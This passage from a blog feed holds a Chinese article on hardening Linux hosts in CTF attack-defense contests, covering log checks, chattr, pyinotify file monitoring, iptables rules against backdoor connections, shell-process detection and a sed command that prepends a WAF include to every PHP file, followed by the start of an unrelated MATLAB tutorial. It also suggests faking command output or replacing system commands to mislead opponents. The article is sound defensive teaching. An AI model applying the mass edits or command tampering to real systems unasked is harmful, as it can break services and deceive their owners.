variable">$5</span> "\t" <span class="token variable">$6</span>}'</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"[1-9][0-9]*\."</span><span class="token operator">|</span><span class="token function">sed</span> -e <span class="token string">'s/::ffff://'</span> -e <span class="token string">'s/:[0-9]*//'</span><span class="token operator">|</span><span class="token function">sort</span><span class="token operator">|</span><span class="token function">uniq</span> -c<span class="token operator">|</span><span class="token function">sort</span> -rn　　查看页面访问排名前十的IP　　<span class="token function">cat</span> /var/log/apache2/access.log <span class="token operator">|</span> <span class="token function">cut</span> -f1 -d <span class="token string">" "</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -k 1 -r <span class="token operator">|</span> <span class="token function">head</span> -10　　查看页面访问排名前十的URL　　<span class="token function">cat</span> /var/log/apache2/access.log <span class="token operator">|</span> <span class="token function">cut</span> -f4 -d <span class="token string">" "</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -k 1 -r <span class="token operator">|</span> <span class="token function">head</span> -10　　</code></pre><p>　　再推荐两篇篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337" target="_blank" rel="noopener">应急排查手册</a><a href="https://yq.aliyun.com/articles/177337%20" target="_blank" rel="noopener"> </a>，<a href="https://xianzhi.aliyun.com/forum/mobile/read/2150.html" target="_blank" rel="noopener">Linux应急响应姿势浅谈</a></p><h2 id="3-文件监控防webshell"><a href="#3-文件监控防webshell" class="headerlink" title="3. 文件监控防webshell"></a>3. 文件监控防webshell</h2><p>　　防御webshell，我们可以监控我们的web目录，对文件的增加或修改等操作进行限制等，粗暴一点的话，就禁止任何文件产生变化，杜绝被传webshell的可能性。</p><p>（1）使用系统 chattr +i 命令<br>　　linux下的文件有着隐藏属性，可以用lsattr命令查看。其中有一个i属性，表示不得更动任意文件或目录。如果你已经有root或者sudo权限了，那么你可以使用”chattr +i 命令”修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括root），如果想进行修改，必须用命令”chattr -i”取消隐藏属性。<br><a href="http://www.runoob.com/linux/linux-comm-chattr.html" target="_blank" rel="noopener">Linux文件保护禁止修改、删除、移动文件等,使用chattr +i保护</a></p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184611437-2010938649.png" alt="img"></p><p>例子：<br>用chattr命令防止系统中某个关键文件被修改：</p><pre><code>chattr +i /etc/profile </code></pre><p>将/var/www/html目录下的文件设置为不允许任何人修改：</p><pre><code>chattr -R +i /var/www/html </code></pre><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184623437-649479414.png" alt="img"></p><p>（2）自己动手丰衣足食<br>　　python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以手工把库文件传到靶机里python库中: /usr/lib/pythonXXX/site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。</p><p>　　安装了pyinotify库之后，我们仅仅运行在机器上： “python -m pyinotify 监控目录路径” 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。<br><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184646562-176521649.png" alt="img"></p><p> 　　但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以自己编程，针对性地实现我们需要的功能，下面是一段代码示例。</p><p>　　　　关于pyinotify 库的用法不再赘述，可以看到我在上述代码中创建了一个事件监控处理的类EventHandler，在这个示例中，我们仅仅关注创建、删除、修改属性、移动操作事件，并且我定义了一个DeleteFileOrDir方法用于自动删除增加的目录或者文件。运行测试截图：</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184705296-121778766.png" alt="img"></p><p>　　我们可以编写功能更加细化的程序，实现如监控文件变更，禁止创建、修改、删除任何文件或目录，自动删除新增文件，把被修改的文件改回去, 删除畸形隐藏文件等功能。我们使用pyinstaller把我代码打包为linux的elf可执行文件。-F参数表示打包为独立可运行文件，命令执行完之后自动生成：build、dist文件夹和SimpleMonitor.spec文件，你可以在dist目录里找到生成的elf程序。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103154294-666393591.png" alt="img"></p><p> 打包的文件在CTFDefense项目的Monitor目录下</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103128012-68438767.png" alt="img"> </p><h2 id="4-网络监控断异常连接"><a href="#4-网络监控断异常连接" class="headerlink" title="4. 网络监控断异常连接"></a>4. 网络监控断异常连接</h2><p>　　linux安全防护一定少不了 iptables了，使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p><p>　　具体我们可以做哪些工作呢，举一些例子：</p><p><strong>（1）关闭所有网络端口，只开放一些比赛的必要端口，也可以防止后门的连接</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#开放ssh</span>iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT<span class="token comment" spellcheck="true">#打开80端口</span>iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT<span class="token comment" spellcheck="true">#开启多端口简单用法</span>iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span>iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</code></pre><p><strong>（2）限制ssh登陆，进行访问控制</strong></p><pre class=" language-bash"><code class="language-bash">iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh</code></pre><p><strong>（3）限制IP连接数和连接速率</strong></p><p>　　我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问+_+</p><p>单个IP的最大连接数为 30</p><pre class=" language-bash"><code class="language-bash">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</code></pre><p>单个IP在60秒内只允许最多新建15个连接</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT</code></pre><p>允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</code></pre><p>　　再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问~~</p><p><strong>（4）数据包简单识别，防止端口复用类的后门或者shell</strong></p><p>　　假设病毒木马程序通过22，80端口像服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p><pre class=" language-bash"><code class="language-bash">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP</code></pre><p><strong>（5）限制访问</strong></p><p>如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p><pre class=" language-bash"><code class="language-bash">iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务</code></pre><p>封杀123.4.5.6这个IP或者某个ip段</p><pre class=" language-bash"><code class="language-bash">iptables -I INPUT -s 123.4.5.6 -j DROPiptables -I INPUT -s 123.4.5.1/24 -j DROP</code></pre><p><strong>（6）过滤异常报文</strong></p><p>　　iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　<span class="token comment" spellcheck="true">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span>iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 <span class="token comment" spellcheck="true">#匹配SYN标识位</span>iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 <span class="token comment" spellcheck="true">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 <span class="token comment" spellcheck="true">#丢弃没标志位的包</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　<span class="token comment" spellcheck="true">#匹配到SYN ACK FIN URG的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到SYN ACK FIN RST的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到SYN FIN PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　<span class="token comment" spellcheck="true">#匹配到SYN FIN RST PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到 SYN,RST的丢弃</span>iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 <span class="token comment" spellcheck="true">#匹配到 SYN,FIN的丢弃</span></code></pre><p><strong> （7）防DDOS攻击</strong></p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT</code></pre><p>　　-m limit: 启用limit扩展<br>　　–limit 20/minute: 允许最多每分钟10个连接<br>　　–limit-burst 100: 当达到100个连接后，才启用上述20/minute限制</p><p>丢弃陌生的TCP响应包,防止反弹式攻击</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -m state --state NEW -p tcp <span class="token operator">!</span> --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</code></pre><p>　　更多的姿势，需要打开我们的脑洞了，下面是一个通用的firewall脚本，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解：</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#Allow youself Ping other hosts , prohibit others Ping you</span>iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROPiptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT<span class="token comment" spellcheck="true">#Close all INPUT FORWARD OUTPUT, just open some ports</span>iptables -P INPUT DROPiptables -P FORWARD DROPiptables -P OUTPUT DROP<span class="token comment" spellcheck="true">#Open ssh</span>iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT<span class="token comment" spellcheck="true">#Open port 80</span>iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT<span class="token comment" spellcheck="true">#Open multiport</span><span class="token comment" spellcheck="true">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><span class="token comment" spellcheck="true">#Control IP connection</span><span class="token comment" spellcheck="true">#The maximum number of connections for a single IP is 30</span>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT<span class="token comment" spellcheck="true">#A single IP allows up to 15 new connections in 60 seconds</span>iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT<span class="token comment" spellcheck="true">#Prevent port reuse</span>iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT<span class="token comment" spellcheck="true">#Filter abnormal packets</span>iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROPiptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP<span class="token comment" spellcheck="true">#Prevent DoS attacks</span>iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT<span class="token comment" spellcheck="true">#Discard unfamiliar TCP response packs to prevent rebound attacks</span>iptables -A INPUT -m state --state NEW -p tcp <span class="token operator">!</span> --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</code></pre><p>注意，对于不同的iptables版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103058590-1008831481.png" alt="img"></p><h2 id="5-综合分析控阻溢出类攻击"><a href="#5-综合分析控阻溢出类攻击" class="headerlink" title="5. 综合分析控阻溢出类攻击"></a>5. 综合分析控阻溢出类攻击</h2><p>　　关于溢出类攻击，我还没有总结出一些很实用的姿势，这里提供一些思路。</p><p>　　一般来说，溢出攻击成功后，会建立shell通道和网络连接，我们可以配合前面提到的命令，从这两方面入手进行检测和阻隔：</p><ul><li><p>　　检测高权限的进程</p></li><li><p>　　检测sh，bash等进程</p></li><li><p>　　检测建立的网络连接</p></li><li><p>　　检查开放的端口</p></li></ul><p>　例子：通过端口和bash发现可疑进程</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922185224228-1344630297.png" alt="img"></p><p>　　如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket连接数的命令为：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> /proc/<span class="token operator">&lt;</span>进程pid<span class="token operator">></span>/fd -l <span class="token operator">|</span> <span class="token function">grep</span> socket: <span class="token operator">|</span> <span class="token function">wc</span> -l</code></pre><p>比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922183157743-1968982131.png" alt="img"></p><p>我们还可以检测可疑进程开启的管道。linux下查看进程管道数的命令类似：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> /proc/<span class="token operator">&lt;</span>进程pid<span class="token operator">></span>/fd -l <span class="token operator">|</span> <span class="token function">grep</span> pipe: <span class="token operator">|</span> <span class="token function">wc</span> -l</code></pre><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922182533290-1861869030.png" alt="img"></p><p> 典型的一个例子是：Apache模块后门mod_rootme，它复用了webserver的80端口，mod_rootme通过管道和bash交互数据，但是由于开启了额外的管道，我们从这个变化上便能察觉到。</p><p>详细内容可以参考：<a href="http://t.qq.com/p/t/330573116082464" target="_blank" rel="noopener">http://t.qq.com/p/t/330573116082464</a>。</p><p>　　总体来说，我们主要可以关注进程情况和网络连接情况，综合分析进程，阻断溢出攻击创建的shel的。</p><h2 id="6-漏洞修复简单粗暴"><a href="#6-漏洞修复简单粗暴" class="headerlink" title="6. 漏洞修复简单粗暴"></a>6. 漏洞修复简单粗暴</h2><p>　　CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p><p>　　1. 删站：如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell，参加过几场比赛确实遇到了这种尴尬的事情，web攻防最后都演变成了拼手速的<code>GetShell+留后门+删站</code>。<br>　　2. 删漏洞页面：大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。<br>　　3. 破坏正常功能：如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似upload等这种功能调用函数。</p><p>　　上面这三种其实都算不上修补漏洞了，真实环境下哪能这么干。</p><p>　　4. 采用正常修补手段：规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195750262-1280426197.png" alt="img"></p><p>　　谈到那个删站，我忍不住想吐槽几句，我个人是不赞成这种做法的，因为这种操作在比赛中很容易拉仇恨并且产生连锁反应，也不利于个人的进步。有些人认为：我先拿下这台服务器说明我有能力，你没进去就说明你没本事，所以我先进去删了站不让其他人进也无可厚非，有能耐你就先拿下它，那你删了我也没意见。也有人说，真正的对抗里，敌人不会对你仁慈～～没错，挺有道理的，而且强者也应该拥有发言权。但是我们不能只从一个角度考虑问题，换个角度去考虑，CTF竞赛虽然是向着真实的网络环境靠拢，但是它的根本目的是提高竞技者的安全技能和知识水平。对于大部分切磋竞技的玩家来说，参加比赛也都是为了让自己获得提高，大家在同一个平台上进行进行切磋对抗，认识到自己和对手身上的优点与不足，这才是竞技。但是这种行为其实从某种意义上来说已经破坏了比赛的公平性，毕竟如果是因为技术不到位，那当然没什么话说，但是如果网站删了，让别人发挥的地方都没有，这种切磋也没有意义。举个不太恰当的例子，这就像两个人打架，你说你比我强，咱们比比再说，但是你都不让我跟你打，这算什么。再换个角度，其实我一直坚信真正具有强者姿态的人，不畏惧挑战、不怕被人超越，不屑于通过这种手段巩固自己的地位。相反，我们只有将自己至于狂风大浪中，才能成长和蜕变，最终成为一个强者。</p><p>　　无论从什么角度考虑，我们应该敢于挑战自身、挑战别人，不断强大自己，不断去征服，无畏无惧、步履铿锵！</p><h2 id="7-安全软件锦上添花"><a href="#7-安全软件锦上添花" class="headerlink" title="7. 安全软件锦上添花"></a>7. 安全软件锦上添花</h2><p>　　可以使用第三方软件的话，装个WAF，安全狗之类的吧。这个我没什么话要说，附个linux安全狗的链接吧：<br>安全狗linux版：<a href="http://www.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://www.safedog.cn/website_safedog.html</a></p><p>　　我们平时也可以搜集或者自己实现一些脚本或者工具备用。</p><p>　　这里有waf一枚：<a href="http://hackblog.cn/post/75.html" target="_blank" rel="noopener">http://hackblog.cn/post/75.html</a></p><p>　　如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：</p><pre><code>find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&#39;\/tmp\/waf.php&#39;);\n/g&quot;</code></pre><p>命令的意思就是查找/var/www/html目录下所有php文件，在头部添加一句，用require函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义：\’，命令转换过来就是这样：</p><pre><code>find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&#39;/tmp/waf.php&#39;);\n/g&quot;</code></pre><p>这样，再次打开时我们就会发现已经引入了自定义waf文件。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928181501247-383805793.png" alt="img"></p><p>如果想整站防护，比如防注入waf，在网站的一个公用文件中，如数据库链接文件<code>config.inc.php</code>中, 引入调用waf代码:</p><pre><code>require_once(&#39;waf.php&#39;);</code></pre><h2 id="8-我可能get了假的flag"><a href="#8-我可能get了假的flag" class="headerlink" title="8. 我可能get了假的flag"></a>8. 我可能get了假的flag</h2><p>　　如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点<code>搅屎</code>的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于”getflag”命令，或者”curl”访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。就拿前之前的ISCC来说，这个也是我赛后想到的。这个getflag是一个elf的程序，在/usr/bin/下，顺手给下载了，有兴趣的同学可以去逆向一波。重点在这，有几次我getflag的时候因为webshell丢了，服务器显示了Error。后来想想，我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢，当然我不知道是不是已经有师傅们用了这个手法。这是模拟的效果：</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195333387-1185344619.png" alt="img"></p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195410106-1460692717.png" alt="img"></p><p> 　　怎样实现？比如我们可以添加alias别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现cd，ls等命令都没法用，会怎么样呢？然而这样会不会不太好～～</p><p>　　最后推荐一个感觉挺实用功能很强的远程连接管理工具，可以极大方便我们的工作：<a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a>。（不是打广告~）</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928201926981-525307116.png" alt="img"></p><p>它支持多种连接方式，可以拖拽进行文件管理。支持在打开的会话一键批量执行命令</p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928202117887-1526141416.png" alt="img"></p><p>还有一个非常方便的ssh端口转发功能，支持本地、远程、动态转发。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928202717403-1093509689.png" alt="img"></p><p>　　还有很多其他功能貌似很厉害，不过我没用过，就不说了…</p><p>　　真不是打广告。</p><h1 id="三-对CTF举办的一点小小建议"><a href="#三-对CTF举办的一点小小建议" class="headerlink" title="三. 对CTF举办的一点小小建议"></a>三. 对CTF举办的一点小小建议</h1><p>　　如今CTF越来越火，对于这些比赛的举办方，我有着一些不成熟想法和小建议，如果您觉得有什么不合适的地方，纯当娱乐：</p><p>　　（1）扩展竞技形式：目前线下赛web攻防占绝大多数，有些小比赛甚至只有若干web服务器，上面放几个不同类型的站点，形式有些单一了，其实可以增加多种对抗模式，甚至可以让参赛选手走出比赛场地。去年曾有幸聆听了诸葛建伟博士关于打破XCTF现有格局的讲座，他提出了体系化攻防演练，认为CTF可以引入实地wifi渗透、门禁系统突破、无人机攻防、GPS信号对抗等，增加比赛多样性与趣味性，让线下赛不再只是局限于小小的机房~~</p><p>　　（2）重视安全分析与防护。安全不仅仅只是网络攻防对抗，数据分析、取证分析、应急响应、追踪溯源等技能也相当重要，并且在安全人才圈里这方面缺口也比较大。今年六月份，启明星辰主办的2017”信息安全铁人三项赛”（分为”个人逆向赛“、”数据分析赛“、”企业攻防赛“三个赛事），其中”数据分析赛“便是一个典型代表，参赛选手需要分析真实企业网络环境下受网络攻击的流量数据，从中找出攻击者、分析其网络攻击行为，如欺骗劫持、爆破、webshell连接操作等，找到并分析攻击者的后门或者恶意软件。这种模式，有助于参赛者接触到相对更加真实的网络攻击流量的对抗与防御。</p><p>　　（3）完善竞技模式的具体细节，尽量避免取巧或者粗暴姿势。比如拿修补漏洞举例子，现在CTF线下赛中绝大部分参赛者为了维持加固自己的shell，往往都会采用删除部分页面的方法，比如登陆、注册页面，因为采用正常打补丁、修改配置等操作都比较费时费事。但在比赛中这种方式是对于学习真正的安全加固、漏洞修补知识没有太多提高。玩CTF不应该仅仅为了比赛而比赛，或者只是为了拿个奖、拿几张证书，还是要注重从中学到点东西，不过有证书对以后就业还是有些帮助的。</p><p> 　　虽然说这些会增加举办方的负担，给选手增加难度，但是这也是一种趋势。CTF必然要经历从普及到提高的转变，并且随着参赛选手水平的提高，我们确实需要一些更有意思的玩法，这是一个相互促进的关系。当然，对于入门级的CTF选手来说，题目难度过大反而会降低比赛体验，对于不同级别的玩家，可以设置不同级别的赛事。从形式上奖，像引入门禁系统突破、无人机攻防等，对于大部分CTF举办方来说实现起来有些难度，毕竟涉及到不同的环境、设备、人员维护等问题，所以这个不应该强求，但是对网络攻防来说增加如windows 服务器、邮件服务器、路由设备等还是可行的。以后的CTF规格和水平会越来越高，对于参赛选手的挑战难度也会越来越大，这对于举办方和选手来说都是挑战，但是挑战亦是机遇，我们应时刻准备好投入战斗！</p><h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　虽说上面提到的这些姿势不可能让我们的靶机变得无懈可击，但是至少能在某种程度上提高它的防御值，希望能对大家有所帮助。最后，祝愿各位CTF参赛选手在比赛中勇创佳绩，同时也祝愿各单位的大佬们都能把CTF筹办的越来越好！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MATLAB基础函数命令</title>
      <link href="/matlab-ji-chu-han-shu-ming-ling/"/>
      <url>/matlab-ji-chu-han-shu-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="一-常用命令"><a href="#一-常用命令" class="headerlink" title="一. 常用命令"></a>一. 常用命令</h1><p><code>dir</code>：列出当前目录下的所有文件<br><code>clc</code>：清除命令窗<br><code>clear all</code>：清除环境（从内存中清除所有变量）<br><code>who</code>：将内存中的当前变量以简单形式列出<br><code>close all</code>: 关闭所有的 Figure 窗口</p><h1 id="二-变量设置"><a href="#二-变量设置" class="headerlink" title="二.变量设置"></a>二.变量设置</h1><h2 id="1-变量命名"><a href="#1-变量命名" class="headerlink" title="1.变量命名"></a>1.变量命名</h2><ul><li><p>MATLAB 的变量名以字母开头，后最多可跟 19 个字母或数字。如 <code>x</code>,<code>y</code>,<code>ae3</code>和<code>d3er45</code>等都是合法的变量名，不能使用内部函数或命令名作为变量名。</p></li><li><p>MATLAB 中的变量名区分大小，ab 与 Ab 表示两个不同的变量。</p></li></ul><h2 id="2-变量赋值"><a href="#2-变量赋值" class="headerlink" title="2.变量赋值"></a>2.变量赋值</h2><h3 id="1-表达式赋值"><a href="#1-表达式赋值" class="headerlink" title="(1) 表达式赋值"></a>(1) 表达式赋值</h3><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">0.02</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4.0</span>a<span class="token operator">=</span><span class="token number">0.0500</span></code></pre><h3 id="2-矩阵赋值"><a href="#2-矩阵赋值" class="headerlink" title="(2) 矩阵赋值"></a>(2) 矩阵赋值</h3><p>数值通常按行输入，行之间用分号隔开。省略最后的分号，MATLAB 会回显矩阵值</p><pre class=" language-matlab"><code class="language-matlab">C<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>；</code></pre><p>通过引用特定的位置可以单独改变某个矩阵元素</p><p>如 <code>S=[5, 6, 4]</code>，用命令 <code>S(2)=8</code>把矩阵 S 的第二个元素值由 6 改成 8。</p><p>引用已定义的矩阵，重新定义一个新矩阵。如 S=[5,6,4]，可定义一个新矩阵。</p><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> B<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span> S <span class="token number">2</span><span class="token punctuation">]</span>　　B<span class="token operator">=</span><span class="token number">3</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">4</span> <span class="token number">2</span></code></pre><h1 id="三-整数操作"><a href="#三-整数操作" class="headerlink" title="三. 整数操作"></a>三. 整数操作</h1><h2 id="fix-x-截尾取整"><a href="#fix-x-截尾取整" class="headerlink" title="fix(x) 